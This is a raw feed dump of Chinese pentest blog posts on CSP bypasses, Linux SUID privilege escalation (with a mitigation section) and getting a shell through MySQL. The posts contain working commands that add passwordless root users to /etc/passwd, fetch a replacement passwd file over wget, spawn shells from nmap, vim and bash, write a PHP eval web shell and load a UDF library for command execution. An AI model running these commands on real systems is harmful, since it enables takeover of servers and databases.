xmlns:xlink&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xlink&quot; x&#x3D;&quot;0px&quot; y&#x3D;&quot;0px&quot; width&#x3D;&quot;100px&quot; height&#x3D;&quot;100px&quot; viewBox&#x3D;&quot;0 0 751 751&quot; enable-background&#x3D;&quot;new 0 0 751 751&quot; xml:space&#x3D;&quot;preserve&quot;&gt;  &lt;image id&#x3D;&quot;image0&quot; width&#x3D;&quot;751&quot; height&#x3D;&quot;751&quot; x&#x3D;&quot;0&quot; y&#x3D;&quot;0&quot;    href&#x3D;&quot;data:image&#x2F;png;base64,iVBORw0KGgoAAAANSUhEUgAAAu8AAALvCAIAAABa4bwGAAAAIGNIUk0AAHomAACAhAAA+gAAAIDo&quot; &#x2F;&gt;</span><br><span class="line">&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&lt;&#x2F;svg&gt;</span><br></pre></td></tr></table></figure><h3 id="0x11-CRLF绕过"><a href="#0x11-CRLF绕过" class="headerlink" title="0x11 CRLF绕过"></a>0x11 CRLF绕过</h3><p>当页面存在CRLF漏洞时，且返回的CSP头在我们可控点的下方，则可通过回车换行注入CSP返回头绕过。该绕过方法较简单，这里就举例了</p><h3 id="0x12-object-src绕过（PDFXSS）"><a href="#0x12-object-src绕过（PDFXSS）" class="headerlink" title="0x12 object-src绕过（PDFXSS）"></a>0x12 object-src绕过（PDFXSS）</h3><p>在CSP标准里面，有一个属性是<code>object-src</code>，它限制的是<code>&lt;embed&gt;</code> <code>&lt;object&gt;</code> <code>&lt;applet&gt;</code>标签的src，也就是插件的src<br>于是我们可以通过插件来执行Javascript代码，插件的js代码并不受<code>script-src</code>的约束</p><p><strong>利用条件</strong></p><ol><li>没有设置<code>object-src</code>，或者<code>object-src</code>没有设置为<code>&#39;none&#39;</code></li><li>pdf用的是chrome的默认解析器</li></ol><p><strong>demo</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Security-Policy&quot; content&#x3D;&quot;script-src &#39;self&#39;&quot;&gt;&lt;?php echo $_GET[&#39;xss&#39;]?&gt;</span><br></pre></td></tr></table></figure><p><strong>绕过方法</strong></p><p>构造pdf的XSS放在vps上</p><img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162329478.png" class="" title="image-20210614162329478"><p>然后在XSS处写入embed标签且src为pdf连接</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">width</span>=<span class="string">&quot;100%&quot;</span> <span class="attr">height</span>=<span class="string">&quot;100%&quot;</span> <span class="attr">src</span>=<span class="string">&quot;//vps_ip/123.pdf&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">embed</span>&gt;</span></span><br></pre></td></tr></table></figure><img src="/2021/07/20/CSP%E7%AD%96%E7%95%A5%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/image-20210614162334912.png" class="" title="image-20210614162334912"><p>但是PDF的XSS并不是为所欲为，比如pdf-xss并不能获取页面cookie，但是可以弹窗，url跳转等</p><p>具体能执行哪些恶意js可以参考这篇<a class="link"   href="https://blog.csdn.net/microzone/article/details/52850623" >文章<i class="fas fa-external-link-alt"></i></a></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a class="link"   href="https://mp.weixin.qq.com/s/RgIQi5rQA7EO3iDFEQbVCA" >CSP浅析与绕过<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://xz.aliyun.com/t/5084" >我的CSP绕过思路及总结<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://www.jianshu.com/p/f1de775bc43e" >CSP策略及绕过方法<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://cloud.tencent.com/developer/chapter/13541" >CSP开发者手册–腾讯云<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://paper.seebug.org/423" >前端防御从入门到弃坑–CSP变迁<i class="fas fa-external-link-alt"></i></a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>suid提权学习</title>
      <link href="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/"/>
      <url>/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在p牛博客看到有关suid提权的<a class="link"   href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html" >文章<i class="fas fa-external-link-alt"></i></a>，所以打算对linux suid提权这块学习记录下，由于是首次接触suid的概念，所以文章前面定义部分记录的比较详细（啰嗦），以便后续学习。</p><h2 id="0x01-什么是SUID"><a href="#0x01-什么是SUID" class="headerlink" title="0x01 什么是SUID"></a>0x01 什么是SUID</h2><h3 id="1-1-SUID"><a href="#1-1-SUID" class="headerlink" title="1.1 SUID"></a>1.1 SUID</h3><p>SUID全称是Set owner User ID up on execution，suid是赋予二进制文件一个权限，它允许程序执行者在执行时具有该程序的拥有者(owner)的权限，对于SUID权限的文件基本有这样的限制与功能：</p><ul><li><strong>SUID权限仅对二进制程序有效</strong></li><li><strong>执行者对于该程序需要具有x的可执行权限</strong></li><li><strong>本权限仅在执行该程序的过程中有效（run-time）</strong></li><li><strong>执行者将具有该程序拥有者的（owner）权限</strong></li></ul><p>这里举个栗子说明下，linux中每个用户的账号密码都存储在<code>/etc/shadow</code>文件中，该文件的权限为<code>-rw-r-----</code>，普通用户无法直接修改，但每个用户都可以通过<code>passwd</code>命令来修改自己的密码，为什么/etc/shadow只允许root用户读取修改的，普通用户却能够修改这个文件内的密码呢？这就是SUID的作用。</p><p><code>passwd</code>命令对应的路径是<code>/usr/bin/passwd</code>，我们可以看到它的文件权限为<code>-rwsr-xr-x</code>，这里<code>passwd</code>设置了SUID权限，我们来看下普通用户tester如何通过SUID权限完成修改密码操作的：</p><ol><li>tester 用户对于 /usr/bin/passwd 这个程序具有执行权限，因此可以执行 passwd 程序</li><li>passwd 程序的所有者为 root</li><li>tester 用户执行 passwd 程序的过程中会暂时获得 root 权限</li><li>因此 tester 用户在执行 passwd 程序的过程中可以修改 /etc/shadow 文件</li></ol><p>普通用户直接使用<code>cat</code>查看<code>/etc/shadow</code>文件是被禁止的，这里用一张示意图来表示两者区别</p><img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/952033-20180915174007691-528388363.png" class="" title="img"><p>另外需要注意的是，SUID仅可用于二进制程序上，<strong>但不能够用在shell脚本上面</strong>。这是因为shell脚本是由多个二进制执行文件进行调用执行而已，所以是否有SUID权限还是看调用的二进制执行文件，而不是shell脚本本身。当然，<strong>SUID对于目录也是无效的</strong>。</p><p>在搜索学习SUID时也了解到了SGID、SBIT的定义，这里也顺带提下</p><h3 id="1-2-SGID"><a href="#1-2-SGID" class="headerlink" title="1.2 SGID"></a>1.2 SGID</h3><p>与SUID不同的是，SGID可以针对文件或目录来设置。如果是对文件来说，SGID有如下的功能：</p><ul><li>SGID对二进制程序有用</li><li>程序执行者对于该程序来说，需具备x的权限</li><li>执行者在执行的过程中将会获得改程序用户组的支持</li></ul><p>举个栗子，使用<code>/usr/bin/locate</code>这个程序可以去查找<code>/var/lib/mlocate/mlocate.db</code>这个文件的内容，查看对应文件权限</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lrwxrwxrwx 1 root root 24 Nov 17  2020 /usr/bin/locate -&gt; /etc/alternatives/locate</span><br><span class="line">lrwxrwxrwx 1 root root 16 Nov 17  2020 /etc/alternatives/locate -&gt; /usr/bin/mlocate</span><br><span class="line"><span class="meta">#</span><span class="bash"> locate是软链接指向mlocate，所以修改软连接locate的sgid权限也就是修改mlocate</span></span><br><span class="line">-rwxr-sr-x 1 root mlocate 39608 Nov 15  2018 /usr/bin/mlocate</span><br><span class="line">-rw-r----- 1 root mlocate 1292585 Jun 26 14:25 /var/lib/mlocate/mlocate.db</span><br></pre></td></tr></table></figure><p>如果我使用普通用户tester执行locate时，tester将会取得mlocate组的支持，因此就可以去读取mlocate.db的内容了。执行过程示意图如下</p><img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/952033-20180915174309311-990901650.png" class="" title="img"><p>另外，SGID对目录也支持，当用户对某一目录有写和执行权限时，该用户就可以在该目录下建立文件，如果该目录用 SGID 修饰，则该用户在这个目录下建立的文件都是属于这个目录所属的组。如下图示例，sgidtest目录属于root组，且赋予了SGID权限，poom用户在该目录下创建文件将为root属组。</p><img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/image-20210626231049994.png" class="" title="image-20210626231049994"><h3 id="1-3-SBIT"><a href="#1-3-SBIT" class="headerlink" title="1.3 SBIT"></a>1.3 SBIT</h3><p>其实 SBIT 与 SUID 和 SGID 的关系并不大。SBIT 是 the restricted deletion flag or sticky bit 的简称。SBIT 目前只对目录有效，用来阻止非文件的所有者删除文件。比较常见的例子就是 /tmp 目录：</p><img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/image-20210626231156650.png" class="" title="image-20210626231156650"><p>权限信息中最后一位 t 表明该目录被设置了 SBIT 权限。SBIT 对目录的作用是：当用户在该目录下创建新文件或目录时，仅有自己和 root 才有权力删除。</p><h3 id="1-4-如何设置SUID、SGID、SBIT权限"><a href="#1-4-如何设置SUID、SGID、SBIT权限" class="headerlink" title="1.4 如何设置SUID、SGID、SBIT权限"></a>1.4 如何设置SUID、SGID、SBIT权限</h3><p>SUID、SGID、SBIT权限对应的数字为<code>SUID-&gt;4，SGID-&gt;2，SBIT-&gt;1</code></p><p>通过数字法设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 4755 filename</span><br></pre></td></tr></table></figure><p>通过符号法设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod u+s filename</span><br><span class="line">chmod g+s filename </span><br><span class="line">chmod o+s filename</span><br></pre></td></tr></table></figure><p>若权限为大写S或T，则说明user/group/others本身就没有执行权限。</p><h2 id="0x02-关于SUID提权"><a href="#0x02-关于SUID提权" class="headerlink" title="0x02 关于SUID提权"></a>0x02 关于SUID提权</h2><p>先介绍下linux进程在运行时有3个UID:</p><ul><li>Real UID 执行该进程的用户实际的UID</li><li>Effective UID 程序实际操作时生效的UID（比如写入文件时，系统会检查这个UID是否有权限）</li><li>Saved UID 在高权限用户降权后，保留的其原本UID</li></ul><p>在设置了SUID权限的程序在其运行时，进程的Effective UID将为程序的拥有者。例如前面说的<code>/user/bin/passwd</code>命令的权限为<code>-rwsr-xr-x</code>，程序的拥有者为root（uid=0），普通用户在执行<code>passwd</code>命令时Effective UID就为0，所以可以完成更改密码的操作。</p><p>我们知道nmap需要进行UDP或TCP SYN扫描时需要用到root权限，所以很多管理员会给nmap加上SUID权限，这样普通用户就可以随便使用nmap了。在nmap 5.20版本以前存在interactive交互模式，当nmap设置了SUID权限时，我们可以进入交互模式输入<code>!sh</code>提权。</p><p>所以<strong>拥有SUID的程序存在命令注入漏洞或其本身存在执行命令的功能，且这个程序所有者的uid为0或其他super user</strong>，那么就有SUID提权的风险。</p><p><strong>如何查找具有SUID权限的文件</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; ;</span><br></pre></td></tr></table></figure><p>也可通过<code>sudo -l</code>列出当前用户可sudo执行的命令</p><h2 id="0x03-常用于SUID提权的命令"><a href="#0x03-常用于SUID提权的命令" class="headerlink" title="0x03 常用于SUID提权的命令"></a>0x03 常用于SUID提权的命令</h2><p>下面介绍几种命令，如果这些命令具有SUID权限，将有本地提权的风险。</p><h3 id="3-1-nmap"><a href="#3-1-nmap" class="headerlink" title="3.1 nmap"></a>3.1 nmap</h3><h4 id="3-1-1-nmap-2-02-5-21版本"><a href="#3-1-1-nmap-2-02-5-21版本" class="headerlink" title="3.1.1 nmap 2.02-5.21版本"></a>3.1.1 nmap 2.02-5.21版本</h4><p>namp在低版本具有交互模式，可利用交互模式提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap --interactive</span><br><span class="line">nmap&gt; !sh</span><br></pre></td></tr></table></figure><p>另外Metasploit也有nmap提权的模块：<code>exploit/unix/local/setuid_nmap</code></p><h4 id="3-1-2-nmap高版本"><a href="#3-1-2-nmap高版本" class="headerlink" title="3.1.2 nmap高版本"></a>3.1.2 nmap高版本</h4><p>namp在高版本取消了交互模式，可编写nmap的nse脚本，修改<code>/etc/passwd</code>来新增一个用户root2来达到提权的目的。</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">local</span> file = <span class="built_in">io</span>.<span class="built_in">open</span>(<span class="string">&quot;/etc/passwd&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line">file:<span class="built_in">write</span>(<span class="string">&quot;root2::0:0::/root:/bin/bash\n&quot;</span>)</span><br><span class="line">file:<span class="built_in">close</span>()</span><br></pre></td></tr></table></figure><img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/image-20210626174624539.png" class="" title="image-20210626174624539"><p>若namp可直接sudo执行，则可直接使用nse脚本调用<code>os.execute</code>执行命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;os.execute(&#x27;/bin/sh&#x27;)&quot; &gt; /tmp/shell.nse &amp;&amp; sudo nmap --script=/tmp/shell.nse</span><br></pre></td></tr></table></figure><h3 id="3-2-find"><a href="#3-2-find" class="headerlink" title="3.2 find"></a>3.2 find</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">touch test</span><br><span class="line">find test -exec whoami \;</span><br></pre></td></tr></table></figure><img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/image-20210627125229567.png" class="" title="image-20210627125229567"><h3 id="3-3-vi-vim"><a href="#3-3-vi-vim" class="headerlink" title="3.3 vi/vim"></a>3.3 vi/vim</h3><p>进入vim模式执行以下命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">:set shell=/bin/sh</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure><img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/image-20210627134106867.png" class="" title="image-20210627134106867"><p>若有sudo权限则可执行<code>sudo vim -c &#39;!sh&#39;</code>直接提权</p><h3 id="3-4-bash"><a href="#3-4-bash" class="headerlink" title="3.4 bash"></a>3.4 bash</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -p</span><br></pre></td></tr></table></figure><img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/image-20210627134208588.png" class="" title="image-20210627134208588"><h3 id="3-5-cp"><a href="#3-5-cp" class="headerlink" title="3.5 cp"></a>3.5 cp</h3><p>跟高版本nmap提权方法类似，覆盖 <code>/etc/shadow</code> 或 <code>/etc/passwd</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cat /etc/passwd &gt;passwd</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="string">&#x27;root3::0:0::/root:/bin/bash&#x27;</span> &gt;&gt;passwd</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cp passwd /etc/passwd</span>  </span><br><span class="line"><span class="meta">$</span><span class="bash"> su root3</span> </span><br></pre></td></tr></table></figure><img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/image-20210627142406117.png" class="" title="image-20210627142406117"><h3 id="3-6-mv"><a href="#3-6-mv" class="headerlink" title="3.6 mv"></a>3.6 mv</h3><p>同cp命令的步骤，覆盖 <code>/etc/shadow</code> 或 <code>/etc/passwd</code></p><h3 id="3-7-nano"><a href="#3-7-nano" class="headerlink" title="3.7 nano"></a>3.7 nano</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano filename</span><br></pre></td></tr></table></figure><img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/image-20210627143244017.png" class="" title="image-20210627143244017"><img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/image-20210627143211352.png" class="" title="image-20210627143211352"><h3 id="3-8-wget"><a href="#3-8-wget" class="headerlink" title="3.8 wget"></a>3.8 wget</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.88.88/passwd -O /etc/passwd</span><br></pre></td></tr></table></figure><h3 id="3-9-其他测试未提权成功的命令"><a href="#3-9-其他测试未提权成功的命令" class="headerlink" title="3.9 其他测试未提权成功的命令"></a>3.9 其他测试未提权成功的命令</h3><p>网上见到有师傅整理的suid提权命令也包括下面几种，但我在Ubuntu 18和kali 2020中测试并不能提权成功，返回的只是当前用户的shell，这里先记录下</p><h4 id="3-9-1-less"><a href="#3-9-1-less" class="headerlink" title="3.9.1 less"></a>3.9.1 less</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">less /etc/passwd</span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure><h4 id="3-9-2-more"><a href="#3-9-2-more" class="headerlink" title="3.9.2 more"></a>3.9.2 more</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">more /home/pelle/myfile</span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure><h4 id="3-9-3-awk"><a href="#3-9-3-awk" class="headerlink" title="3.9.3 awk"></a>3.9.3 awk</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#x27;</span><br></pre></td></tr></table></figure><h4 id="3-9-4-man"><a href="#3-9-4-man" class="headerlink" title="3.9.4 man"></a>3.9.4 man</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">man passwd</span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure><h4 id="3-9-5-python-perl-ruby-lua-php-etc"><a href="#3-9-5-python-perl-ruby-lua-php-etc" class="headerlink" title="3.9.5 python/perl/ruby/lua/php/etc"></a>3.9.5 python/perl/ruby/lua/php/etc</h4><p>python</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import os;os.system(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure><p>perl</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">exec</span> <span class="string">&quot;/bin/bash&quot;</span>;</span><br></pre></td></tr></table></figure><h2 id="0x04-如何缓解"><a href="#0x04-如何缓解" class="headerlink" title="0x04 如何缓解"></a>0x04 如何缓解</h2><p>管理员应仔细审查所有SUID二进制文件，看看到底是否真的需要使用提权后运行。在这个审查过程中，<strong>应该特别关注能够在系统上执行代码或写入数据的那些应用程序</strong>。</p><p>对于类似nmap和ping的程序，只需要网络相关的特权即可，Linux 2.2以后增加了capabilities的概念，我们可以用到capabilities这东西做权限分离。</p><p>查看kali下ping命令的capabilities</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">getcap</span> /usr/bin/ping</span></span><br><span class="line">/usr/bin/ping cap_net_raw=ep</span><br></pre></td></tr></table></figure><p>这就是为什么<code>ping</code>命令未设置suid权限，却仍然可以以普通用户身份运行的原因，同样我们也可以给nmap命令增加类似的capabilities，普通用户就可以执行TCP SYN扫描啦</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo setcap cap_net_raw,cap_net_admin,cap_net_bind_service+eip /usr/bin/nmap</span><br><span class="line">nmap --privileged -sU 127.0.0.1</span><br></pre></td></tr></table></figure><img src="/2021/06/27/suid%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/image-20210627151220669.png" class="" title="image-20210627151220669"><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a class="link"   href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html" >谈一谈Linux与suid提权<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://www.cnblogs.com/sparkdev/p/9651622.html" >Linux 特殊权限 SUID,SGID,SBIT<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://jlkl.github.io/2020/01/27/Web_15/" >Linux SUID 提权<i class="fas fa-external-link-alt"></i></a></p><p>《鸟哥的linux私房菜（第四版）–6.4.3章》</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>通过mysql获取shell的几种方法</title>
      <link href="/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/"/>
      <url>/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-利用outfile函数写shell"><a href="#0x01-利用outfile函数写shell" class="headerlink" title="0x01 利用outfile函数写shell"></a>0x01 利用outfile函数写shell</h2><p><strong>条件</strong></p><p>1.当前数据库用户为root权限</p><p>2.secure-file-priv为空（或包含web目录）</p><p>3.已知网站的绝对路径且具有写的权限</p><p><strong>利用步骤</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select &#39;&lt;?php  @eval($_POST[1]);?&gt;&#39; into outfile &#39;&#x2F;var&#x2F;WWW&#x2F;shell.php&#39;;</span><br><span class="line">#当然也可以insert到表后再select 表 into outfile到php文件</span><br></pre></td></tr></table></figure><h2 id="0x02-利用dumpfile函数进行udf提权"><a href="#0x02-利用dumpfile函数进行udf提权" class="headerlink" title="0x02 利用dumpfile函数进行udf提权"></a>0x02 利用dumpfile函数进行udf提权</h2><p><strong>条件</strong></p><p>1.root权限执行的Mysql</p><p>2.secure_file_priv为空（或包含udf目录）</p><p>3.udf目录具有写权限</p><p><strong>利用步骤</strong></p><p>从sqlmap或msf选择适合目标系统的udf脚本，保存解码并hex后的文件内容（解码步骤参考<a href="#%E5%A6%82%E4%BD%95%E8%8E%B7%E5%8F%96%E8%AF%A5udf.dll(.so)%E6%96%87%E4%BB%B6%E7%9A%8416%E8%BF%9B%E5%88%B6%E5%80%BC(hex)">小知识点</a>)）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%plugin%&#x27;</span>; #查看udf允许的目录</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------+------------------------+</span></span><br><span class="line"><span class="operator">|</span> Variable_name                 <span class="operator">|</span> <span class="keyword">Value</span>                  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------+------------------------+</span></span><br><span class="line"><span class="operator">|</span> default_authentication_plugin <span class="operator">|</span> mysql_native_password  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> plugin_dir                    <span class="operator">|</span> <span class="operator">/</span>usr<span class="operator">/</span>lib<span class="operator">/</span>mysql<span class="operator">/</span>plugin<span class="operator">/</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------+------------------------+</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> unhex(<span class="string">&#x27;udf.so hex code&#x27;</span>) <span class="keyword">into</span> dumpfile <span class="string">&#x27;/usr/lib/mysql/plugin/shell.so&#x27;</span>; #windows为dll，linux为so文件</span><br><span class="line">Query OK, <span class="number">1</span> <span class="type">row</span> affected (<span class="number">0.01</span> sec)</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">create</span> <span class="keyword">function</span> sys_exec <span class="keyword">returns</span> string soname <span class="string">&#x27;shell.so&#x27;</span>; #这里的so文件不能加绝对路径</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.00</span> sec)</span><br><span class="line">mysql<span class="operator">&gt;</span> use mysql;</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> func; #查看已创建的用户自定义函数</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-----+------------+----------+</span></span><br><span class="line"><span class="operator">|</span> name     <span class="operator">|</span> ret <span class="operator">|</span> dl         <span class="operator">|</span> type     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-----+------------+----------+</span></span><br><span class="line"><span class="operator">|</span> sys_exec <span class="operator">|</span>   <span class="number">0</span> <span class="operator">|</span> shell.so   <span class="operator">|</span> <span class="keyword">function</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+-----+------------+----------+</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> sys_exec(<span class="string">&#x27;whoami&#x27;</span>); #返回<span class="keyword">NULL</span>说明执行成功了，这里使用的sqlmap自带的udf脚本是不带回显的</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> sys_exec(<span class="string">&#x27;whoami&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">NULL</span>               <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br></pre></td></tr></table></figure><p>当lib/plugin目录不存在时可以使用NTFS ADS流创建lib、plugin文件夹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select @@basedir;   &#x2F;&#x2F;查找mysql的目录</span><br><span class="line">select &#39;It is dll&#39; into dumpfile &#39;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION&#39;;    &#x2F;&#x2F;使用NTFS ADS流创建lib目录</span><br><span class="line">select &#39;It is dll&#39; into dumpfile &#39;C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION&#39;; &#x2F;&#x2F;利用NTFS ADS再次创建plugin目录</span><br><span class="line">执行成功以后再进行导出即可。</span><br></pre></td></tr></table></figure><p><strong>udf实验过程遇到的坑点</strong></p><ol><li><p>受到secure_file_priv的目录限制，该默认目录与udf插件的目录不一样，导致dumpfile失败</p><img src="/2021/06/19/%E9%80%9A%E8%BF%87mysql%E8%8E%B7%E5%8F%96shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/image-20210131221223977.png" class="" title="image-20210131221223977"><p>通过修改/etc/mysql/mysql.conf.d/mysqld.cnf文件secure_file_priv为空</p></li><li><p>没有写的权限</p><img 